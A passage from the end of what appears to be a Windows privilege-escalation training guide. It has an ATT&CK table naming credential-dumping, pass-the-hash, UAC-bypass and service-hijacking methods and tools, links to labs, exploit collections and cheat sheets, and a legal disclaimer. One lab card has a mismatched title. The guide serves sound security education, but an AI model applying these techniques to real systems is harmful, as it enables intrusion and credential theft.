  ```
  :::
::

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Method |
|---|---|---|
| [T1068](https://attack.mitre.org/techniques/T1068/) | Exploitation for Privilege Escalation | Kernel exploits, PrintNightmare |
| [T1574.001](https://attack.mitre.org/techniques/T1574/001/) | DLL Search Order Hijacking | DLL hijacking in services |
| [T1574.009](https://attack.mitre.org/techniques/T1574/009/) | Unquoted Path Hijacking | Unquoted service path exploitation |
| [T1574.002](https://attack.mitre.org/techniques/T1574/002/) | DLL Side-Loading | Planting malicious DLLs |
| [T1543.003](https://attack.mitre.org/techniques/T1543/003/) | Windows Service | Service binary replacement, weak ACLs |
| [T1134.001](https://attack.mitre.org/techniques/T1134/001/) | Token Impersonation/Theft | Potato attacks, named pipe impersonation |
| [T1548.002](https://attack.mitre.org/techniques/T1548/002/) | Bypass User Account Control | Fodhelper, eventvwr, UACME |
| [T1053.005](https://attack.mitre.org/techniques/T1053/005/) | Scheduled Task | Writable task script modification |
| [T1552.001](https://attack.mitre.org/techniques/T1552/001/) | Credentials In Files | Unattend.xml, config files, history |
| [T1552.002](https://attack.mitre.org/techniques/T1552/002/) | Credentials in Registry | AutoLogon, VNC passwords, GPP |
| [T1003.001](https://attack.mitre.org/techniques/T1003/001/) | LSASS Memory | Mimikatz, procdump, comsvcs.dll |
| [T1003.002](https://attack.mitre.org/techniques/T1003/002/) | SAM Database | reg save, shadow copy dump |
| [T1550.002](https://attack.mitre.org/techniques/T1550/002/) | Pass the Hash | PTH with Impacket, Mimikatz |
| [T1550.003](https://attack.mitre.org/techniques/T1550/003/) | Pass the Ticket | Kerberos ticket injection |

---

## Practice Labs

::card-group
  ::card
  ---
  title: TryHackMe — Windows PrivEsc
  icon: i-lucide-graduation-cap
  to: https://tryhackme.com/room/windowsprivesc20
  target: _blank
  ---
  Guided rooms covering service exploits, registry misconfigurations, token impersonation, and credential harvesting on Windows.
  ::

  ::card
  ---
  title: HackTheBox — Windows Machines
  icon: i-lucide-box
  to: https://www.hackthebox.com/
  target: _blank
  ---
  Real-world Windows machines from Easy to Insane. Each machine requires privilege escalation for the root/admin flag.
  ::

  ::card
  ---
  title: Vulnerable By Design — Dvta
  icon: i-lucide-monitor
  to: https://github.com/srini0x00/dvta
  target: _blank
  ---
  Damn Vulnerable Thick Client Application — practice exploiting Windows desktop applications with DLL hijacking, insecure storage, and more.
  ::

  ::card
  ---
  title: YOURLS — Windows Exploit Lab
  icon: i-lucide-flask-conical
  to: https://github.com/sagishahar/lpeworkshop
  target: _blank
  ---
  Sagi Shahar's Windows Privilege Escalation Workshop — downloadable VM with 20+ intentional misconfigurations to practice on.
  ::
::

---

## Reference & Resources

::card-group
  ::card
  ---
  title: PayloadsAllTheThings — Windows PrivEsc
  icon: i-simple-icons-github
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
  target: _blank
  ---
  Exhaustive cheatsheet of Windows privilege escalation techniques with copy-paste commands for every vector. **Bookmark this.**
  ::

  ::card
  ---
  title: WinPEAS — Privilege Escalation Awesome Scripts
  icon: i-simple-icons-github
  to: https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
  target: _blank
  ---
  The most comprehensive automated Windows enumeration tool. Highlights escalation vectors with color-coded output.
  ::

  ::card
  ---
  title: HackTricks — Windows PrivEsc
  icon: i-lucide-book-open
  to: https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html
  target: _blank
  ---
  Detailed methodology guide covering every Windows privilege escalation technique with examples and tool references.
  ::

  ::card
  ---
  title: LOLBAS — Living Off The Land Binaries
  icon: i-lucide-terminal
  to: https://lolbas-project.github.io/
  target: _blank
  ---
  Windows equivalent of GTFOBins. Catalog of legitimate Windows binaries that can be abused for execution, download, persistence, and more.
  ::

  ::card
  ---
  title: MITRE ATT&CK — Privilege Escalation
  icon: i-lucide-shield
  to: https://attack.mitre.org/tactics/TA0004/
  target: _blank
  ---
  Framework mapping all privilege escalation techniques used by real-world threat actors and APT groups.
  ::

  ::card
  ---
  title: Windows Kernel Exploits Collection
  icon: i-simple-icons-github
  to: https://github.com/SecWiki/windows-kernel-exploits
  target: _blank
  ---
  Curated collection of pre-compiled Windows kernel exploits organized by CVE. Essential reference for matching exploits to target versions.
  ::
::

---

::warning
**Legal Disclaimer:** The techniques described in this guide are intended for **authorized penetration testing**, **CTF competitions**, **security research**, and **defensive education** only. Always obtain **written permission** before testing on any system. Unauthorized access to computer systems is a criminal offense under the CFAA, Computer Misuse Act, and equivalent laws worldwide.
::